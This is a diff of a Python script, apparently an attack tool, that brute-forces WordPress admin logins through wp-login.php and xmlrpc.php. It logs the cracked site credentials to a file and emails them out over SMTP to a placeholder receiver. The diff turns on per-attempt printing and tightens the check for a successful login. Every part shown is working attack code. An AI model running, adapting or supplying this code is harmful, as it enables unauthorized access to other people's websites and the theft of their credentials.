@@ -16,12 +16,12 @@ headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gec
 
 def send_smtp(data):
     try:
-        email_sender = ['list of email address']
-        server = smtplib.SMTP('smtp.gmail.com', 587) #change to your mail host server
+        email_sender = [''] # EMAIL SENDER LIST 
+        server = smtplib.SMTP('#MAILHOST', #MAILHOSTPORT)
         server.starttls()
         randomize = random.choice(email_sender)
-        server.login(randomize, '#password')
-        server.sendmail(randomize, '#where to receive the emails', data.as_string())
+        server.login(randomize, '#PASSWORD')
+        server.sendmail(randomize, '#RECEIVER EMAIL', data.as_string())
     except:
         pass
     
@@ -50,8 +50,8 @@ def brute_force_login(sites, username, cookies):
                 'testcookie': '1'}
 
                 r = requests.post(f'{sites}wp-login.php', headers=headers, timeout=10, data=data, verify=False, allow_redirects=False)
-                #print(f'Status Code : {r.status_code} URL: {r.url} - Login INFO : {username}::{passwords}')
-                if f'{username}%' in r.headers['Set-Cookie']:
+                print(f'Status Code : {r.status_code} URL: {r.url} - Login INFO : {username}::{passwords}')
+                if f'{username}%' in r.headers['Set-Cookie'] and 'wordpress_logged_in' in r.headers['Set-Cookie']:
                     print(f'[Log in Success] >> {sites} - {username}::{passwords}')
                     data_1 = f'[Log in success] >> {sites} - {username}::{passwords}'
                     data_output_email = MIMEText(data_1)
@@ -83,7 +83,7 @@ def brute_force_xmlrpc(sites, username, cookies):
 
                 data = """<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>%s</value></param><param><value>%s</value></param></params></methodCall>""" % (username, passwords)
                 r = requests.post(f'{sites}xmlrpc.php', headers=headers, data=data, timeout=10, verify=False)
-                #print(f'Status Code : {r.status_code} URL: {r.url} - Login INFO : {username}::{passwords}')
+                print(f'Status Code : {r.status_code} URL: {r.url} - Login INFO : {username}::{passwords}')
                 if r.ok:
                     if 'isAdmin' in r.text:
                         print(f'[Log in success] >> {sites} - {username}::{passwords}')
@@ -93,7 +93,6 @@ def brute_force_xmlrpc(sites, username, cookies):
                         with open('wp_crackxmlrpc.txt', 'a+') as output:
                             output.write(f'[Log in success] >> {sites} - {username}::{passwords}\n')
                 if not r.ok:
-                    print('Calling Page login bruteforce')
                     brute_force_login(sites, username, cookies)
     except:
         pass
